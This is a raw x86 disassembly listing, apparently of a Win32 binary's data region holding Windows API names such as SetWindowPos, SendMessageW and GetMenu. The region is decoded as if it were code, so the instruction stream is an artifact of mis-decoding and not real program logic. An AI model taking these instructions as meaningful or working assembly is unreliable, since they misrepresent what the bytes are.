  41e2c7:	fs ins BYTE PTR es:[edi],dx
  41e2c9:	add    BYTE PTR gs:[eax],al
  41e2cc:	dec    eax
  41e2cd:	add    dl,BYTE PTR [ebx+0x65]
  41e2d0:	je     0x41e31f
  41e2d2:	outs   dx,BYTE PTR gs:[esi]
  41e2d4:	jne    0x41e2d6
  41e2d6:	sub    eax,DWORD PTR [ecx]
  41e2d8:	inc    edi
  41e2d9:	gs je  0x41e329
  41e2dc:	outs   dx,BYTE PTR gs:[esi]
  41e2de:	jne    0x41e2e0
  41e2e0:	adc    eax,DWORD PTR [edx]
  41e2e2:	push   edx
  41e2e3:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x69577265
  41e2ec:	outs   dx,BYTE PTR ds:[esi]
  41e2ed:	outs   dx,DWORD PTR fs:[esi]
  41e2ef:	ja     0x41e33e
  41e2f1:	gs jae 0x41e367
  41e2f4:	popa   
  41e2f5:	addr16 gs push edi
  41e2f8:	add    BYTE PTR [eax],al
  41e2fa:	push   ebp
  41e2fb:	add    DWORD PTR [edi+0x65],eax
  41e2fe:	je     0x41e353
  41e300:	arpl   WORD PTR [edx+0x6f],si
  41e303:	ins    BYTE PTR es:[edi],dx
  41e304:	ins    BYTE PTR es:[edi],dx
  41e305:	push   eax
  41e306:	outs   dx,DWORD PTR ds:[esi]
  41e307:	jae    0x41e309
  41e309:	add    bh,cl
  41e30b:	add    DWORD PTR [ebp+0x65],ecx
  41e30e:	jae    0x41e383
  41e310:	popa   
  41e311:	addr16 gs inc edx
  41e314:	outs   dx,DWORD PTR ds:[esi]
  41e315:	js     0x41e35c
  41e317:	js     0x41e35a
  41e319:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  41e320:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x65470164
  41e328:	je     0x41e37f
  41e32a:	jo     0x41e390
  41e32c:	popa   
  41e32d:	je     0x41e394
  41e32f:	push   edx
  41e330:	outs   dx,BYTE PTR ds:[si]
  41e332:	add    BYTE PTR [eax],al
  41e334:	mov    dh,0x1
  41e336:	dec    esp
  41e337:	outs   dx,DWORD PTR ds:[esi]
  41e338:	popa   
  41e339:	fs dec ebp
  41e33b:	outs   dx,BYTE PTR gs:[esi]
  41e33d:	jne    0x41e380
  41e33f:	add    BYTE PTR [ecx],cl
  41e341:	add    BYTE PTR [ecx+0x70],al
  41e344:	jo     0x41e3ab
  41e346:	outs   dx,BYTE PTR ds:[esi]
  41e347:	fs dec ebp
  41e349:	outs   dx,BYTE PTR gs:[esi]
  41e34b:	jne    0x41e3a4
  41e34d:	add    BYTE PTR [ebp+0x0],bl
  41e350:	inc    ebx
  41e351:	jb     0x41e3b8
  41e353:	popa   
  41e354:	je     0x41e3bb
  41e356:	dec    ecx
  41e357:	arpl   WORD PTR [edi+0x6e],bp
  41e35a:	dec    ecx
  41e35b:	outs   dx,BYTE PTR ds:[esi]
  41e35c:	imul   esi,DWORD PTR fs:[edx+0x65],0x7463
  41e364:	ins    BYTE PTR es:[edi],dx
  41e365:	add    DWORD PTR [edi+0x65],eax
  41e368:	je     0x41e3c1
  41e36a:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  41e371:	outs   dx,BYTE PTR ds:[esi]
  41e372:	addr16 inc ecx
  41e374:	add    BYTE PTR [eax],al
  41e376:	ja     0x41e379
  41e378:	inc    edi
  41e379:	gs je  0x41e3d3
  41e37c:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e383:	js     0x41e3f9
  41e385:	dec    esp
  41e386:	outs   dx,BYTE PTR gs:[esi]
  41e388:	addr16 je 0x41e3f3
  41e38b:	push   edi
  41e38c:	add    BYTE PTR [eax],al
  41e38e:	cmp    eax,0x65684300
  41e393:	arpl   WORD PTR [ebx+0x52],bp
  41e396:	popa   
  41e397:	imul   ebp,DWORD PTR fs:[edi+0x42],0x6f747475
  41e39f:	outs   dx,BYTE PTR ds:[esi]
  41e3a0:	add    BYTE PTR [eax],al
  41e3a2:	add    BYTE PTR [ecx],0x49
  41e3a5:	outs   dx,BYTE PTR ds:[esi]
  41e3a6:	data16 ins BYTE PTR es:[edi],dx
  41e3a8:	popa   
  41e3a9:	je     0x41e410
  41e3ab:	push   edx
  41e3ac:	arpl   WORD PTR gs:[eax+eax*1-0x70],si
  41e3b1:	add    dl,BYTE PTR [edx+esi*2+0x61]
  41e3b5:	arpl   WORD PTR [ebx+0x50],bp
  41e3b8:	outs   dx,DWORD PTR ds:[esi]
  41e3b9:	jo     0x41e430
  41e3bb:	jo     0x41e40a
  41e3bd:	outs   dx,BYTE PTR gs:[esi]
  41e3bf:	jne    0x41e3c1
  41e3c1:	add    BYTE PTR ds:0x6c655202,dl
  41e3c7:	gs popa 
  41e3c9:	jae    0x41e430
  41e3cb:	inc    esp
  41e3cc:	inc    ebx
  41e3cd:	add    BYTE PTR [ebx],ch
  41e3cf:	add    dl,BYTE PTR [ebx+0x65]
  41e3d2:	outs   dx,BYTE PTR ds:[esi]
  41e3d3:	fs dec ebp
  41e3d5:	gs jae 0x41e44b
  41e3d8:	popa   
  41e3d9:	addr16 gs push edi
  41e3dc:	add    BYTE PTR [eax],al
  41e3de:	fild   DWORD PTR [ecx]
  41e3e0:	dec    ebp
  41e3e1:	outs   dx,DWORD PTR ds:[esi]
  41e3e2:	jbe    0x41e449
  41e3e4:	push   edi
  41e3e5:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41e3ec:	mov    dl,0x0
  41e3ee:	inc    esp
  41e3ef:	jb     0x41e452
  41e3f1:	ja     0x41e439
  41e3f3:	jb     0x41e456
  41e3f5:	ins    DWORD PTR es:[edi],dx
  41e3f6:	gs inc ebx
  41e3f8:	outs   dx,DWORD PTR ds:[esi]
  41e3f9:	outs   dx,BYTE PTR ds:[esi]
  41e3fa:	je     0x41e46e
  41e3fc:	outs   dx,DWORD PTR ds:[esi]
  41e3fd:	ins    BYTE PTR es:[edi],dx
  41e3fe:	add    BYTE PTR [eax],al
  41e400:	stos   DWORD PTR es:[edi],eax
  41e401:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e405:	fs inc ebx
  41e407:	jne    0x41e47b
  41e409:	jae    0x41e47a
  41e40b:	jb     0x41e44e
  41e40d:	add    BYTE PTR [eax+0x2],ch
  41e410:	push   ebx
  41e411:	gs je  0x41e469
  41e414:	jae    0x41e47b
  41e416:	jb     0x41e467
  41e418:	bound  ebp,QWORD PTR [edx+0x65]
  41e41b:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  41e41f:	outs   dx,WORD PTR ds:[esi]
  41e421:	jb     0x41e490
  41e423:	popa   
  41e424:	je     0x41e48f
  41e426:	outs   dx,DWORD PTR ds:[esi]
  41e427:	outs   dx,BYTE PTR ds:[esi]
  41e428:	push   edi
  41e429:	add    BYTE PTR [ecx+0x0],ah
  41e42c:	inc    ebx
  41e42d:	jb     0x41e494
  41e42f:	popa   
  41e430:	je     0x41e497
  41e432:	push   eax
  41e433:	outs   dx,DWORD PTR ds:[esi]
  41e434:	jo     0x41e4ab
  41e436:	jo     0x41e485
  41e438:	outs   dx,BYTE PTR gs:[esi]
  41e43a:	jne    0x41e43c
  41e43c:	xor    al,0x2
  41e43e:	push   ebx
  41e43f:	gs je  0x41e485
  41e442:	ins    BYTE PTR es:[edi],dx
  41e443:	popa   
  41e444:	jae    0x41e4b9
  41e446:	dec    esp
  41e447:	outs   dx,DWORD PTR ds:[esi]
  41e448:	outs   dx,BYTE PTR ds:[esi]
  41e449:	addr16 push edi
  41e44b:	add    BYTE PTR [ebx+0x0],ah
  41e44e:	inc    ebx
  41e44f:	jb     0x41e4b6
  41e451:	popa   
  41e452:	je     0x41e4b9
  41e454:	push   edi
  41e455:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  41e45c:	push   edi
  41e45d:	add    BYTE PTR [ecx+eax*1+0x63497349],bl
  41e464:	outs   dx,DWORD PTR ds:[esi]
  41e465:	outs   dx,BYTE PTR ds:[esi]
  41e466:	imul   esp,DWORD PTR [ebx+0x0],0x49018500
  41e46d:	outs   dx,BYTE PTR ds:[esi]
  41e46e:	jae    0x41e4d5
  41e470:	jb     0x41e4e6
  41e472:	dec    ebp
  41e473:	outs   dx,BYTE PTR gs:[esi]
  41e475:	jne    0x41e4c0
  41e477:	je     0x41e4de
  41e479:	ins    DWORD PTR es:[edi],dx
  41e47a:	push   edi
  41e47b:	add    ah,ah
  41e47d:	add    DWORD PTR [edi+0x66],ecx
  41e480:	data16 jae 0x41e4e8
  41e483:	je     0x41e4d7
  41e485:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  41e48a:	scas   al,BYTE PTR es:[edi]
  41e48b:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e48f:	fs inc ebx
  41e491:	jne    0x41e505
  41e493:	jae    0x41e504
  41e495:	jb     0x41e4ee
  41e497:	add    BYTE PTR [ebx],al
  41e499:	add    BYTE PTR [ecx+0x64],al
  41e49c:	push   0x75
  41e49e:	jae    0x41e514
  41e4a0:	push   edi
  41e4a1:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  41e4a8:	arpl   WORD PTR [ebp+eax*2+0x78],si
  41e4ac:	add    BYTE PTR [eax],al
  41e4ae:	js     0x41e4b1
  41e4b0:	inc    edi
  41e4b1:	gs je  0x41e50b
  41e4b4:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e4bb:	js     0x41e531
  41e4bd:	push   edi
  41e4be:	add    BYTE PTR [eax],al
  41e4c0:	push   cs
  41e4c1:	add    DWORD PTR [edi+0x65],eax
  41e4c4:	je     0x41e50a
  41e4c6:	ins    BYTE PTR es:[edi],dx
  41e4c7:	addr16 inc ebx
  41e4c9:	je     0x41e53d
  41e4cb:	ins    BYTE PTR es:[edi],dx
  41e4cc:	dec    ecx
  41e4cd:	inc    esp
  41e4ce:	add    BYTE PTR [eax],al
  41e4d0:	mov    esp,0x6e695702
  41e4d5:	outs   dx,DWORD PTR fs:[esi]
  41e4d7:	ja     0x41e51f
  41e4d9:	jb     0x41e54a
  41e4db:	ins    DWORD PTR es:[edi],dx
  41e4dc:	push   eax
  41e4dd:	outs   dx,DWORD PTR ds:[esi]
  41e4de:	imul   ebp,DWORD PTR [esi+0x74],0x49018300
  41e4e5:	outs   dx,BYTE PTR ds:[esi]
  41e4e6:	jae    0x41e54d
  41e4e8:	jb     0x41e55e
  41e4ea:	dec    ebp
  41e4eb:	outs   dx,BYTE PTR gs:[esi]
  41e4ed:	jne    0x41e530
  41e4ef:	add    BYTE PTR [esi+0x73795302],al
  41e4f5:	je     0x41e55c
  41e4f7:	ins    DWORD PTR es:[edi],dx
  41e4f8:	push   eax
  41e4f9:	popa   
  41e4fa:	jb     0x41e55d
  41e4fc:	ins    DWORD PTR es:[edi],dx
  41e4fd:	gs je  0x41e565
  41e500:	jb     0x41e575
  41e502:	dec    ecx
  41e503:	outs   dx,BYTE PTR ds:[esi]
  41e504:	outs   dx,WORD PTR ds:[esi]
  41e506:	push   edi
  41e507:	add    BYTE PTR [edx],dh
  41e509:	add    DWORD PTR [edi+0x65],eax
  41e50c:	je     0x41e55b
  41e50e:	outs   dx,BYTE PTR gs:[esi]
  41e510:	jne    0x41e55b
  41e512:	je     0x41e579
  41e514:	ins    DWORD PTR es:[edi],dx
  41e515:	inc    ebx
  41e516:	outs   dx,DWORD PTR ds:[esi]
  41e517:	jne    0x41e587
  41e519:	je     0x41e51b
  41e51b:	add    BYTE PTR [ecx+0x4b6b5602],dh
  41e521:	gs jns 0x41e577
  41e524:	arpl   WORD PTR [ecx+0x6e],sp
  41e527:	push   edi
  41e528:	add    BYTE PTR [eax],al
  41e52a:	add    eax,DWORD PTR [edx]
  41e52c:	push   edx
  41e52d:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  41e536:	popa   
  41e537:	jae    0x41e5ac
  41e539:	inc    ebp
  41e53a:	js     0x41e57d
  41e53c:	add    BYTE PTR [eax],al
  41e53e:	ret    
  41e53f:	add    BYTE PTR [ebp+0x6e],al
  41e542:	fs inc esp
  41e544:	imul   esp,DWORD PTR [ecx+0x6c],0x4600676f
  41e54b:	add    BYTE PTR [ebx+0x6c],al
  41e54e:	outs   dx,DWORD PTR ds:[esi]
  41e54f:	jae    0x41e5b6
  41e551:	inc    esp
  41e552:	gs jae 0x41e5c0
  41e555:	je     0x41e5c6
  41e557:	jo     0x41e559
  41e559:	add    BYTE PTR [eax+0x44734901],bl
  41e55f:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  41e566:	jae    0x41e5db
  41e568:	popa   
  41e569:	addr16 gs push edi
  41e56c:	add    BYTE PTR [eax],al
  41e56e:	out    0x1,eax
  41e570:	dec    edi
  41e571:	jo     0x41e5d8
  41e573:	outs   dx,BYTE PTR ds:[esi]
  41e574:	inc    esp
  41e575:	gs jae 0x41e5e3
  41e578:	je     0x41e5e9
  41e57a:	jo     0x41e5d3
  41e57c:	add    BYTE PTR [eax],al
  41e57e:	and    BYTE PTR [edx],al
  41e580:	push   ebx
  41e581:	arpl   WORD PTR [edx+0x6f],si
  41e584:	ins    BYTE PTR es:[edi],dx
  41e585:	ins    BYTE PTR es:[edi],dx
  41e586:	push   edi
  41e587:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  41e58e:	add    BYTE PTR [eax],al
  41e590:	mov    al,ds:0x57734901
  41e595:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41e59c:	xor    eax,0x61684300
  41e5a1:	jb     0x41e5f7
  41e5a3:	outs   dx,DWORD PTR ds:[esi]
  41e5a4:	dec    edi
  41e5a5:	gs ins DWORD PTR es:[edi],dx
  41e5a7:	push   edi
  41e5a8:	add    BYTE PTR [eax],al
  41e5aa:	xor    al,BYTE PTR [edx]
  41e5ac:	push   ebx
  41e5ad:	gs je  0x41e5f3
  41e5b0:	popa   
  41e5b1:	jb     0x41e618
  41e5b3:	je     0x41e605
  41e5b5:	outs   dx,DWORD PTR ds:[esi]
  41e5b6:	jae    0x41e5b8
  41e5b8:	daa    
  41e5b9:	add    DWORD PTR [edi+0x65],eax
  41e5bc:	je     0x41e609
  41e5be:	gs jns 0x41e623
  41e5c1:	outs   dx,DWORD PTR ds:[esi]
  41e5c2:	popa   
  41e5c3:	jb     0x41e629
  41e5c5:	push   esp
  41e5c6:	jns    0x41e638
  41e5c8:	gs add bh,ch
  41e5cb:	add    DWORD PTR [eax+0x65],edx
  41e5ce:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  41e5d3:	jae    0x41e636
  41e5d5:	addr16 gs push edi
  41e5d8:	add    BYTE PTR [eax],al
  41e5da:	push   0x74654701
  41e5df:	push   edi
  41e5e0:	imul   ebp,DWORD PTR [esi+0x64],0x5900776f
  41e5e7:	add    BYTE PTR [ebx+0x72],al
  41e5ea:	gs popa 
  41e5ec:	je     0x41e653
  41e5ee:	inc    esp
  41e5ef:	imul   esp,DWORD PTR [ecx+0x6c],0x6150676f
  41e5f6:	jb     0x41e659
  41e5f8:	ins    DWORD PTR es:[edi],dx
  41e5f9:	push   edi
  41e5fa:	add    BYTE PTR [eax],al
  41e5fc:	je     0x41e600
  41e5fe:	push   ebx
  41e5ff:	gs je  0x41e659
  41e602:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e609:	js     0x41e67f
  41e60b:	push   edi
  41e60c:	add    BYTE PTR [eax],al
  41e60e:	xchg   ebx,eax
  41e60f:	add    BYTE PTR [ebp+eiz*2+0x73],al
  41e613:	je     0x41e687
  41e615:	outs   dx,DWORD PTR ds:[esi]
  41e616:	jns    0x41e659
  41e618:	arpl   WORD PTR [ebx+0x65],sp
  41e61b:	ins    BYTE PTR es:[edi],dx
  41e61c:	gs jb  0x41e680
  41e61f:	je     0x41e690
  41e621:	jb     0x41e677
  41e623:	popa   
  41e624:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41e628:	cmc    
  41e629:	add    BYTE PTR [edi+0x65],al
  41e62c:	je     0x41e671
  41e62e:	ins    BYTE PTR es:[edi],dx
  41e62f:	popa   
  41e630:	jae    0x41e6a5
  41e632:	dec    ecx
  41e633:	outs   dx,BYTE PTR ds:[esi]
  41e634:	outs   dx,WORD PTR ds:[esi]
  41e636:	inc    ebp
  41e637:	js     0x41e67a
  41e639:	add    BYTE PTR [ebp+0x1],ch
  41e63c:	inc    edi
  41e63d:	gs je  0x41e697
  41e640:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  41e647:	outs   dx,BYTE PTR ds:[esi]
  41e648:	addr16 push edi
  41e64a:	add    BYTE PTR [eax],al
  41e64c:	fld    QWORD PTR [eax]
  41e64e:	inc    ebp
  41e64f:	jno    0x41e6c6
  41e651:	popa   
  41e652:	ins    BYTE PTR es:[edi],dx
  41e653:	push   edx
  41e654:	arpl   WORD PTR gs:[eax+eax*1+0x5b],si
  41e659:	add    dl,BYTE PTR [ebx+0x65]
  41e65c:	je     0x41e6b1
  41e65e:	arpl   WORD PTR [edx+0x6f],si
  41e661:	ins    BYTE PTR es:[edi],dx
  41e662:	ins    BYTE PTR es:[edi],dx
  41e663:	push   eax
  41e664:	outs   dx,DWORD PTR ds:[esi]
  41e665:	jae    0x41e667
  41e667:	add    BYTE PTR [edx+0x57734901],ah
  41e66d:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  41e674:	imul   esp,DWORD PTR [ebx+0x6f],0xa6006564
  41e67b:	add    DWORD PTR [ebx+0x69],ecx
  41e67e:	ins    BYTE PTR es:[edi],dx
  41e67f:	ins    BYTE PTR es:[edi],dx
  41e680:	push   esp
  41e681:	imul   ebp,DWORD PTR [ebp+0x65],0x1810072
  41e688:	dec    ecx
  41e689:	outs   dx,BYTE PTR ds:[esi]
  41e68a:	push   ebx
  41e68b:	outs   dx,BYTE PTR gs:[esi]
  41e68d:	fs dec ebp
  41e68f:	gs jae 0x41e705
  41e692:	popa   
  41e693:	addr16 gs inc ebp
  41e696:	js     0x41e698
  41e698:	pop    ebx
  41e699:	add    BYTE PTR [ebx+0x72],al
  41e69c:	gs popa 
  41e69e:	je     0x41e705
  41e6a0:	dec    ecx
  41e6a1:	arpl   WORD PTR [edi+0x6e],bp
  41e6a4:	inc    esi
  41e6a5:	jb     0x41e716
  41e6a7:	ins    DWORD PTR es:[edi],dx
  41e6a8:	push   edx
  41e6a9:	gs jae 0x41e71b
  41e6ac:	jne    0x41e720
  41e6ae:	arpl   WORD PTR [ebp+0x0],sp
  41e6b1:	add    BYTE PTR [edx+0x0],cl
  41e6b4:	inc    ebx
  41e6b5:	outs   dx,DWORD PTR ds:[esi]
  41e6b6:	jo     0x41e731
  41e6b8:	inc    ecx
  41e6b9:	arpl   WORD PTR [ebx+0x65],sp
  41e6bc:	ins    BYTE PTR es:[edi],dx
  41e6bd:	gs jb  0x41e721
  41e6c0:	je     0x41e731
  41e6c2:	jb     0x41e718
  41e6c4:	popa   
  41e6c5:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  41e6c9:	add    BYTE PTR [esi+0x66654400],cl
  41e6cf:	push   edi
  41e6d0:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  41e6d7:	outs   dx,DWORD PTR ds:[esi]
  41e6d8:	arpl   WORD PTR [ecx+0x0],ax
  41e6db:	add    BYTE PTR [ebp+0x79656b02],bh
  41e6e1:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  41e6e5:	jbe    0x41e74c
  41e6e7:	outs   dx,BYTE PTR ds:[esi]
  41e6e8:	je     0x41e6ea
  41e6ea:	fadd   QWORD PTR [eax]
  41e6ec:	inc    ebp
  41e6ed:	outs   dx,BYTE PTR ds:[esi]
  41e6ee:	jne    0x41e75d
  41e6f0:	push   edi
  41e6f1:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41e6f8:	adc    eax,DWORD PTR [ecx]
  41e6fa:	inc    edi
  41e6fb:	gs je  0x41e742
  41e6fe:	outs   dx,DWORD PTR ds:[esi]
  41e6ff:	jne    0x41e763
  41e701:	ins    BYTE PTR es:[edi],dx
  41e702:	gs inc ebx
  41e704:	ins    BYTE PTR es:[edi],dx
  41e705:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  41e70c:	add    BYTE PTR [eax],al
  41e70e:	cwde   
  41e70f:	add    BYTE PTR [ebp+eiz*2+0x73],al
  41e713:	je     0x41e787
  41e715:	outs   dx,DWORD PTR ds:[esi]
  41e716:	jns    0x41e76f
  41e718:	imul   ebp,DWORD PTR [esi+0x64],0x2e00776f
  41e71f:	add    BYTE PTR [ebx+0x68],al
  41e722:	popa   
  41e723:	jb     0x41e775
  41e725:	jb     0x41e78c
  41e727:	jbe    0x41e76a
  41e729:	add    BYTE PTR [esi],ah
  41e72b:	add    dl,BYTE PTR [ebx+0x65]
  41e72e:	outs   dx,BYTE PTR ds:[esi]
  41e72f:	fs dec ebp
  41e731:	gs jae 0x41e7a7
  41e734:	popa   
  41e735:	addr16 gs inc ecx
  41e738:	add    BYTE PTR [eax],al
  41e73a:	mov    DWORD PTR [eax],eax
  41e73c:	inc    esp
  41e73d:	gs inc si
  41e740:	jb     0x41e7a3
  41e742:	ins    DWORD PTR es:[edi],dx
  41e743:	gs push eax
  41e745:	jb     0x41e7b6
  41e747:	arpl   WORD PTR [ecx+0x0],ax
  41e74a:	or     al,BYTE PTR [edx]
  41e74c:	push   edx
  41e74d:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6f487265
  41e756:	je     0x41e7a3
  41e758:	gs jns 0x41e75b
  41e75b:	add    BYTE PTR [eax],bh
  41e75d:	add    dl,BYTE PTR [ebx+0x65]
  41e760:	je     0x41e7a5
  41e762:	jne    0x41e7d6
  41e764:	jae    0x41e7d5
  41e766:	jb     0x41e768
  41e768:	push   0x1
  41e76a:	inc    edi
  41e76b:	gs je  0x41e7c5
  41e76e:	imul   ebp,DWORD PTR [esi+0x64],0x4344776f
  41e775:	add    BYTE PTR ds:0x74655302,bh
  41e77b:	inc    esp
  41e77c:	ins    BYTE PTR es:[edi],dx
  41e77d:	addr16 dec ecx
  41e77f:	je     0x41e7e6
  41e781:	ins    DWORD PTR es:[edi],dx
  41e782:	dec    ecx
  41e783:	outs   dx,BYTE PTR ds:[esi]
  41e784:	je     0x41e786
  41e786:	sbb    eax,0x73614300
  41e78b:	arpl   WORD PTR [ecx+0x64],sp
  41e78e:	gs push edi
  41e790:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41e797:	add    BYTE PTR [ebx],dh
  41e799:	add    DWORD PTR [edi+0x65],eax
  41e79c:	je     0x41e7eb
  41e79e:	outs   dx,BYTE PTR gs:[esi]
  41e7a0:	jne    0x41e7eb
  41e7a2:	je     0x41e809
  41e7a4:	ins    DWORD PTR es:[edi],dx
  41e7a5:	dec    ecx
  41e7a6:	inc    esp
  41e7a7:	add    BYTE PTR [eax+eax*1+0x6c616944],bl
  41e7ae:	outs   dx,DWORD PTR ds:[esi]
  41e7af:	addr16 inc edx
  41e7b1:	outs   dx,DWORD PTR ds:[esi]
  41e7b2:	js     0x41e804
  41e7b4:	popa   
  41e7b5:	jb     0x41e818
  41e7b7:	ins    DWORD PTR es:[edi],dx
  41e7b8:	inc    ecx
  41e7b9:	add    BYTE PTR [edx+eax*1+0x74697753],al
  41e7c0:	arpl   WORD PTR [eax+0x54],bp
  41e7c3:	outs   dx,DWORD PTR ds:[esi]
  41e7c4:	push   esp
  41e7c5:	push   0x69577369
  41e7ca:	outs   dx,BYTE PTR ds:[esi]
  41e7cb:	outs   dx,DWORD PTR fs:[esi]
  41e7cd:	ja     0x41e7cf
  41e7cf:	add    BYTE PTR [eax+eax*1],bh
  41e7d2:	inc    ebx
  41e7d3:	push   0x4d6b6365
  41e7d8:	outs   dx,BYTE PTR gs:[esi]
  41e7da:	jne    0x41e82e
  41e7dc:	popa   
  41e7dd:	imul   ebp,DWORD PTR fs:[edi+0x49],0x6d6574
  41e7e5:	add    ah,al
  41e7e7:	add    DWORD PTR [ebp+0x61],ecx
  41e7ea:	jo     0x41e830
  41e7ec:	imul   esp,DWORD PTR [ecx+0x6c],0x6552676f
  41e7f3:	arpl   WORD PTR [eax+eax*1-0x5],si
  41e7f7:	add    DWORD PTR [eax+0x74],edx
  41e7fa:	dec    ecx
  41e7fb:	outs   dx,BYTE PTR ds:[esi]
  41e7fc:	push   edx
  41e7fd:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  41e802:	cdq    
  41e803:	add    DWORD PTR [ecx+0x73],ecx
  41e806:	inc    esp
  41e807:	ins    BYTE PTR es:[edi],dx
  41e808:	addr16 inc edx
  41e80a:	jne    0x41e880
  41e80c:	je     0x41e87d
  41e80e:	outs   dx,BYTE PTR ds:[esi]
  41e80f:	inc    ebx
  41e810:	push   0x656b6365
  41e815:	add    BYTE PTR fs:[eax],al
  41e818:	mov    edi,0x70737702
  41e81d:	jb     0x41e888
  41e81f:	outs   dx,BYTE PTR ds:[esi]
  41e820:	je     0x41e888
  41e822:	inc    ecx
  41e823:	add    BYTE PTR [ebx+0x1],bl
  41e826:	inc    edi
  41e827:	gs je  0x41e87d
  41e82a:	jns    0x41e89f
  41e82c:	je     0x41e893
  41e82e:	ins    DWORD PTR es:[edi],dx
  41e82f:	dec    ebp
  41e830:	outs   dx,BYTE PTR gs:[esi]
  41e832:	jne    0x41e834
  41e834:	add    al,0x2
  41e836:	push   edx
  41e837:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  41e840:	popa   
  41e841:	jae    0x41e8b6
  41e843:	inc    ebp
  41e844:	js     0x41e89d
  41e846:	add    BYTE PTR [eax],al
  41e848:	pusha  
  41e849:	add    BYTE PTR [ebx+0x72],al
  41e84c:	gs popa 
  41e84e:	je     0x41e8b5
  41e850:	dec    ebp
  41e851:	outs   dx,BYTE PTR gs:[esi]
  41e853:	jne    0x41e855
  41e855:	add    al,bh
  41e857:	add    BYTE PTR [edi+0x65],al
  41e85a:	je     0x41e89f
  41e85c:	ins    BYTE PTR es:[edi],dx
  41e85d:	popa   
  41e85e:	jae    0x41e8d3
  41e860:	dec    esp
  41e861:	outs   dx,DWORD PTR ds:[esi]
  41e862:	outs   dx,BYTE PTR ds:[esi]
  41e863:	addr16 inc ecx
  41e865:	add    BYTE PTR ds:0x74654701,dh
  41e86b:	dec    ebp
  41e86c:	outs   dx,BYTE PTR gs:[esi]
  41e86e:	jne    0x41e8b9
  41e870:	je     0x41e8d7
  41e872:	ins    DWORD PTR es:[edi],dx
  41e873:	dec    ecx
  41e874:	outs   dx,BYTE PTR ds:[esi]
  41e875:	outs   dx,WORD PTR ds:[esi]
  41e877:	push   edi
  41e878:	add    BYTE PTR [eax],al
  41e87a:	mov    ecx,0x616f4c01
  41e87f:	fs dec ebp
  41e881:	outs   dx,BYTE PTR gs:[esi]
  41e883:	jne    0x41e8dc
  41e885:	add    BYTE PTR [edx+0x1],ah
  41e888:	inc    edi
  41e889:	gs je  0x41e8e0
  41e88c:	outs   dx,DWORD PTR ds:[esi]
  41e88d:	jo     0x41e8e6
  41e88f:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41e896:	dec    ebx
  41e897:	add    DWORD PTR [edi+0x65],eax
  41e89a:	je     0x41e8ec
  41e89c:	jb     0x41e90d
  41e89e:	jo     0x41e8f7
  41e8a0:	add    BYTE PTR [eax],al
  41e8a2:	cmp    al,BYTE PTR [edx]
  41e8a4:	push   ebx
  41e8a5:	gs je  0x41e8eb
  41e8a8:	jne    0x41e91c
  41e8aa:	jae    0x41e91b
  41e8ac:	jb     0x41e8fe
  41e8ae:	outs   dx,DWORD PTR ds:[esi]
  41e8af:	jae    0x41e8b1
  41e8b1:	add    bh,al
  41e8b3:	add    DWORD PTR [ebp+0x61],ecx
  41e8b6:	jo     0x41e90e
  41e8b8:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  41e8bf:	gs jns 0x41e907
  41e8c2:	js     0x41e91b
  41e8c4:	add    BYTE PTR [eax],al
  41e8c6:	jp     0x41e8ca
  41e8c8:	push   ebx
  41e8c9:	push   0x6143776f
  41e8ce:	jb     0x41e935
  41e8d0:	je     0x41e8d2
  41e8d2:	add    eax,0x67655202
  41e8d7:	imul   esi,DWORD PTR [ebx+0x74],0x6c437265
  41e8de:	popa   
  41e8df:	jae    0x41e954
  41e8e1:	push   edi
  41e8e2:	add    BYTE PTR [eax],al
  41e8e4:	scas   eax,DWORD PTR es:[edi]
  41e8e5:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e8e9:	fs dec ecx
  41e8eb:	arpl   WORD PTR [edi+0x6e],bp
  41e8ee:	inc    ecx
  41e8ef:	add    bl,dh
  41e8f1:	add    BYTE PTR [edi+0x65],al
  41e8f4:	je     0x41e939
  41e8f6:	popa   
  41e8f7:	jb     0x41e95e
  41e8f9:	je     0x41e94b
  41e8fb:	outs   dx,DWORD PTR ds:[esi]
  41e8fc:	jae    0x41e8fe
  41e8fe:	jnp    0x41e902
  41e900:	push   ebx
  41e901:	push   0x7543776f
  41e906:	jb     0x41e97b
  41e908:	outs   dx,DWORD PTR ds:[esi]
  41e909:	jb     0x41e90b
  41e90b:	add    BYTE PTR [eax+0x1],bl
  41e90e:	inc    edi
  41e90f:	gs je  0x41e965
  41e912:	jne    0x41e976
  41e914:	dec    ebp
  41e915:	outs   dx,BYTE PTR gs:[esi]
  41e917:	jne    0x41e919
  41e919:	add    cl,al
  41e91b:	add    DWORD PTR [edi+ebp*2+0x6f],ecx
  41e91f:	imul   esi,DWORD PTR [ebp+0x70],0x49
  41e923:	arpl   WORD PTR [edi+0x6e],bp
  41e926:	dec    ecx
  41e927:	fs inc esi
  41e929:	jb     0x41e99a
